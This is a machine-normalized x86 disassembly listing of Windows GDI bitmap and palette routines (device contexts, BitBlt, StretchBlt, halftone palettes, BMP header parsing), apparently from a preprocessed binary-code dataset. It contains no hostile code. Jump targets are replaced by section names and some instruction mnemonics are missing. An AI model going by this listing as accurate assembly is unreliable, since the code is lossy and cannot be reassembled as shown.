mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425b18
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425b18
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_429383
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_428b08
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_4293dc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_426cb4
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_428934
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_429444
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax esi
call sub_429c4c
mov eax [ esi + 0x28 ]
call sub_428938
mov eax [ esi + 0x2c ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419e14
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_429480
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_429c4c
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_429542
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_403af4
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_429ebc
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_428934
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_428938
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
movzx eax [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
movzx eax [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_419e40
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_42957c
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_429c4c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42960c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_42916c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_428b08
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_429ebc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_429611
mov eax [ ebp - 0x8 ]
call sub_4238c0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_404eec
call sub_404f40
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_42963c
push ebx
mov ebx eax
mov eax ebx
call sub_429930
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40f944
pop ebx
retn
sub_42966c
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41b798
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_429c4c
lea eax [ ebx + 0x2c ]
call sub_40f944
push esp
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_429ebc
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4296e0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
movzx edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4257f0
mov eax ebx
call sub_429d5c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_429a6c
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_42991e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_425714
push eax
call SetStretchBltMode
mov eax ebx
call sub_4299b0
movzx edx [ r-xdata ]
call sub_4257f0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_429cfc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4299b0
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429925
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4298b3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_425b18
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4299b0
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_425cc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_429930
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_429c5c
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_42957c
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_425a70
sub_4299b0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_429c5c
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_428740
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_42963c
sub_4299f8
push ebx
mov ebx eax
mov eax ebx
call sub_429c4c
mov eax ebx
call sub_429c5c
mov edx ebx
mov eax ebx
call sub_42963c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_429a1c
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_429a9c
push ebx
push esi
mov esi eax
mov bl 0x8
mov eax esi
call sub_429a1c
cmp al 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
lea edx [ eax + 0x18 ]
lea eax [ edx + 0x18 ]
movzx ecx [ eax + 0xe ]
cmp ecx 0x10
jg r-xdata
xor ebx ebx
jmp r-xdata
sub ecx 0x18
je r-xdata
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x6
jmp r-xdata
sub ecx 0x8
je r-xdata
mov eax [ eax + 0x10 ]
sub eax 0x1
jb r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov bl 0x4
jmp r-xdata
sub eax 0x2
je r-xdata
mov bl 0x1
jmp r-xdata
sub ecx 0x3
je r-xdata
mov bl 0x7
cmp [ edx + 0x44 ] 0x7e0
jne r-xdata
jmp r-xdata
mov bl 0x2
jmp r-xdata
sub ecx 0x4
je r-xdata
mov bl 0x5
jmp r-xdata
mov bl 0x3
jmp r-xdata
jmp r-xdata
sub_429b20
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_42963c
mov eax [ ebx + 0x28 ]
add eax 0x18
mov ebp eax
lea esi [ eax + 0x18 ]
test edi edi
jl r-xdata
mov eax [ rw-data ]
call sub_4259c8
cmp edi [ ebp + 0x8 ]
jl r-xdata
movzx edx [ esi + 0xe ]
mov ecx 0x20
mov eax [ esi + 0x4 ]
call sub_425ca8
imul edi
add eax [ ebp + 0x14 ]
mov ebx eax
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub eax edi
dec eax
mov edi eax
mov eax ebx
call sub_429bd8
call GdiFlush
mov eax [ esi + 0x8 ]
test eax eax
jle r-xdata
sub_429b88
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_424230
mov eax ebx
call sub_429a6c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_4299b0
xor edx edx
pop ecx
call sub_4256a0
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_429bd8
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_429d5c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_428b08
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
movzx ecx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_429c5c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41b734
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_429cdf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_429cfc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_429c4c
mov eax ebx
call sub_429c5c
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_429b88
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_4291d0
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_4286c4
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_429d5c
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
movzx ecx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_426210
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_4286c4
push 0x0
call GetDC
call sub_425b18
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_429e14
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_4259e0
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_42957c
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_429c4c
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_403af4
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_429e98
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41b714
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_42a554
pop esi
pop ebx
retn
sub_429ebc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_429f44
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
movzx edx [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_404800
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_429fa4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_428938
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_428934
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429fab
push rw-data
call LeaveCriticalSection
retn
sub_429fbc
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_42a554
pop edx
pop edi
pop esi
pop ebx
retn
sub_429fe4
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_402f00
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_42a505
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_42a4d8
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_403af4
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
movzx edx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
movzx edx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_4259f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
movzx eax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41b9b0
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_403af4
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
movzx eax [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41b940
mov eax [ ebx + 0x20 ]
movzx edx [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
movzx eax [ ebx + 0xe ]
call sub_425c88
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_425ca8
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41b940
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
push 0x0
call GetDC
call sub_425b18
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42a453
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
